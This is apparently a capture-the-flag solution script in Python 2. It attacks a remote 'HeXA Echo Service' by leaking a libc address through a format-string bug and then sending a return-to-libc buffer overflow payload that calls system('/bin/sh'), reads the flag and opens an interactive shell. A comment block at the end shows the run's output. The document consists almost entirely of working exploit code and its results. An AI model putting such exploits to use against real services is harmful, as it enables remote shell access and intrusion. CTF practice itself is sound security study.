from socket import *
from struct import *
import telnetlib
import time
import sys

def recv_until(s, data):
	buf = ""
	while True:
		c = s.recv(1)
		buf += c
		if data in buf:
			break
	return buf

host = 'play.hexa.pro'
port = 12345

s = socket( AF_INET, SOCK_STREAM )
s.connect((host,port))

# STAGE 1: Leak address
recv_until(s, "Welcome to HeXA Echo Service!")
s.send("%8x LEAP%8x\n")
recv_until(s, "LEAP")
leaked_addr = int(s.recv(8),16)

# leaked <_IO_2_1_stdin_> address
print "[+] Leaked address : " + hex(leaked_addr)

# Calculate system function and /bin/sh string address
IO_STDIN_offset = 0x1a7c20
libc_base = leaked_addr - IO_STDIN_offset

system_offset = 0x3fcd0
system_addr = libc_base + system_offset
sh_offset = 0x15da84
sh_addr = libc_base + sh_offset

print "[+] libc base addr : " + hex(libc_base)
print "[+] system addr : " + hex(system_addr)
print "[+] /bin/sh addr: " + hex(sh_addr)


# STAGE 2: Exploit (Use RTL, Return To Libc)
payload = ""
payload+= "A"*256 # buffer
payload+= "B"*12  # dummy
payload+= pack("<L", system_addr)
payload+= "CCCC"
payload+= pack("<L", sh_addr)

# Above payload execute system("/bin/sh")

print "[+] Send payload..."
s.send(payload + "\n")

print "[*] You got a shell!"
s.send("cat flag\n")
 
# Interact with server
try:
        t = telnetlib.Telnet()
        t.sock = s
        t.interact()
        t.close()
except KeyboardInterrupt:
        pass

'''
[+] Leaked address : 0xf778bc20
[+] libc base addr : 0xf75e4000
[+] system addr : 0xf7623cd0
[+] /bin/sh addr: 0xf7741a84
[+] Send payload...
[*] You got a shell!

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBB▒<b▒CCCC▒t▒
What the buggy echo server :(
'''

